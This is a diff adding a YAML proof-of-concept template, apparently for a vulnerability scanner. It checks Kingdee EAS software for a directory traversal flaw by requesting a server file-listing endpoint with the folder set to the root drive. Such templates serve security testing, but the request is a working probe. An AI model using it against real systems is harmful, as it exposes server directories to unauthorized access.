@@ -1,0 +1,18 @@
+id: poc-yaml-kingdee-eas-directory-traversal
+info:
+  name: 金蝶-EAS-系统目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: 金蝶OA
+variables:
+  r_path: '/
+
+    C://'
+requests:
+- method: GET
+  path: /appmonitor/protected/selector/server_file/files?folder={{.r_path}}&suffix=
+  expression: 'contains(body, "{\"total\":0,\"rows\":") && !contains(body, "folder")
+
+    '
+transport: http
